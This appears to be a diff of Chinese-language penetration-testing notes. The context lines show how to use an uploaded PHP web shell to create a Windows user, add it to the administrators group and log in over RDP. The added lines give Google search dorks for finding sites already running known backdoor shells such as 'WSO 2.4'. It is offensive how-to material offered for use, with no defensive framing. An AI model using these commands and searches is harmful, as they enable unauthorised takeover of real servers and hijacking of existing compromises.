@@ -90,3 +90,6 @@ kali终端访问mysql数据库 mysql -u 用户名 -h 主机ip -p 密码
 通过https://网站/网站可访问和可写的路径/xx.php?cmd=net user xxx 123456 /add即可创建一个用户名为xxx密码为123456的用户
 通过https://网站/网站可访问和可写的路径/xx.php?cmd=net localgroup administrators xxx /add 即可xxx用户添加本地组管理员权限
 windows启动mstsc 输入服务器ip xxx和123456 登录服务器
+后门查找的小例子：
+1.google 搜索 intitle:"=[1n73ct10n private shell]="
+2.google 搜索 intitle:"WSO 2.4" [sec.info],[Files],[Console],[sql],[php],[safe mode],[String tools],[Bruteforce],[Network],[Self remove]
